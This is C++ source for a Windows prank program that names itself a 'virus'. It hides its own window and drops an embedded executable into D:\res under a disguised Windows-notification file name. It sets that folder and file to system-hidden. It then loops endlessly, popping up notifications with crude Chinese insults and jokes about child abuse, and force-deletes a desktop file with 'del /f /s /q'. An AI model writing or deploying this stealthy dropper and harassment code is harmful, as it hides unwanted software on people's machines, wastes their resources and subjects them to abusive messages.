#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <iostream>  
#include <fstream>  
#include <string> 
#include <thread>
#include <cstdlib>
#include "resource.h"
using namespace std;
BOOL FreeExe()
{
	system("ATTRIB -S -H D:\\res");
	system("ATTRIB -S -H D:\\res\\Windows_Notification_Push_Open_Platform.exe");
	string path = "D:\\res";
	bool flag = CreateDirectory(path.c_str(), NULL);
	HMODULE hModule = GetModuleHandle(NULL);
	HRSRC hRsrc = FindResource(hModule, MAKEINTRESOURCE(IDR_EXECUTABLE1), TEXT("EXECUTABLE"));
	DWORD dwSize = SizeofResource(hModule, hRsrc);
	HGLOBAL hGlobal = LoadResource(hModule, hRsrc);
	LPVOID lpVoid = LockResource(hGlobal);
	FILE* fp = fopen("D:\\res\\Windows_Notification_Push_Open_Platform.exe", "wb+");
	fwrite(lpVoid, sizeof(char), dwSize, fp);
	fclose(fp);
	FreeResource(hGlobal);
	return TRUE;
}
struct EnumWindowsData {
	int nWindowShow;
};

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
	string path = "";
	const char* homeProfile = "UserProFile";
	char homePath[8032] = { 0 };
	unsigned int pathSize = GetEnvironmentVariable(homeProfile, homePath, 8032);
	path = string(homePath);
	EnumWindowsData* pData = reinterpret_cast<EnumWindowsData*>(lParam);
	char title[256] = { 0 };
	GetWindowText(hwnd, title, sizeof(title));
	if (string(title) == path + "\\Desktop\\Stupid-ass_39_Virus.exe")
	{
		ShowWindow(hwnd, pData->nWindowShow);
	}
	return TRUE;
}
void 吃垃圾()
{
	for (;;)
	{
		string path = "";
		const char* homeProfile = "UserProFile";
		char homePath[8024] = { 0 };
		unsigned int pathSize = GetEnvironmentVariable(homeProfile, homePath, 8024);
		path = string(homePath);
		string filepath = string(path + "\\Desktop\\垃圾");
		ifstream file(filepath);
		if (file.is_open() && file.good())
		{
			file.close();
			STARTUPINFOA si;
			PROCESS_INFORMATION pi;
			ZeroMemory(&si, sizeof(si));
			si.cb = sizeof(si);
			ZeroMemory(&pi, sizeof(pi));
			string cmdLine = "\"D:\\res\\Windows_Notification_Push_Open_Platform.exe\" --aumi 傻逼39 --name 傻逼39 --id 傻逼39 --text01 可以把垃圾给我吃吗，球球了  --text02 我妈从小就虐待我，可怜的我只能吃垃圾 --attribute 来自39的犯贱 --button 滚你妈蛋恶心死我了，饿死你你个傻逼 --button 诺，（leng在了地上）吃吧";
			const char* cmdLineStr = cmdLine.c_str();
			CreateProcessA(
				NULL,
				const_cast<char*>(cmdLineStr),
				NULL,
				NULL,
				FALSE,
				0,
				NULL,
				NULL,
				&si,
				&pi
			);
			WaitForSingleObject(pi.hProcess, INFINITE);
			DWORD exitCode;
			if (!GetExitCodeProcess(pi.hProcess, &exitCode))
			{
				CloseHandle(pi.hProcess);
				CloseHandle(pi.hThread);
			}
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			if (exitCode == 23)
			{
				system("del /f /s /q %UserProFile%\\Desktop\\垃圾");
			}
		}
	}
}
 int main()
{
	EnumWindowsData data = { SW_HIDE };
	EnumWindows(reinterpret_cast<WNDENUMPROC>(EnumWindowsProc), reinterpret_cast<LPARAM>(&data));
	BOOL ref = FreeExe();
	system("ATTRIB +S +H D:\\res");
	system("ATTRIB +S +H D:\\res\\Windows_Notification_Push_Open_Platform.exe");
	吃垃圾();
	return 0;
}